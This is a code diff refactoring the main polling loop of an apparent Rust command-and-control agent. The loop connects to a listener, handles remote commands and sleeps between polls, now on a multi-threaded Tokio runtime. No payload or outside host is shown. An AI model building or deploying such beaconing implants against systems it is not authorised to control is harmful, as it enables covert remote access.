@@ -1,12 +1,14 @@
 use libc_print::libc_println;
-use std::{thread, time::Duration};
-use tokio::runtime::Runtime;
+use std::{sync::Arc, time::Duration};
+use tokio::runtime::Builder;
 
-pub mod commands;
+pub mod command;
 pub mod common;
+pub mod handler;
 pub mod init;
+pub mod spawner;
 
-use commands::command_handler;
+use handler::command_handler;
 
 #[cfg(feature = "ntallocator")]
 use mod_ntallocator::NtAllocator;
@@ -21,26 +23,34 @@ use mod_agentcore::instance;
 
 /// Main routine that initializes the runtime and repeatedly checks the connection status.
 pub fn routine() {
-    let rt = Runtime::new().unwrap(); // Create a new Tokio runtime
+    let rt = Arc::new(
+        Builder::new_multi_thread()
+            .worker_threads(4)
+            .enable_all()
+            .build()
+            .unwrap(),
+    );
+
     loop {
         unsafe {
             if !instance().session.connected {
                 // If not connected, try to connect to the listener
-                rt.block_on(async {
-                    init_protocol().await;
-                });
+                init_protocol(rt.clone());
             }
 
             if instance().session.connected {
                 // If connected, handle incoming commands
-                command_handler();
+                command_handler(rt.clone());
             }
 
-            // Sleep for 15 seconds before checking again
+            // Sleep for 15 seconds before checking again, ensuring all tasks are done.
             libc_println!("Sleep: {}", instance().config.polling_interval);
-            thread::sleep(Duration::from_secs(
-                instance().config.polling_interval as u64,
-            ));
+            rt.block_on(async {
+                tokio::time::sleep(Duration::from_secs(
+                    instance().config.polling_interval as u64,
+                ))
+                .await;
+            });
         }
     }
 }
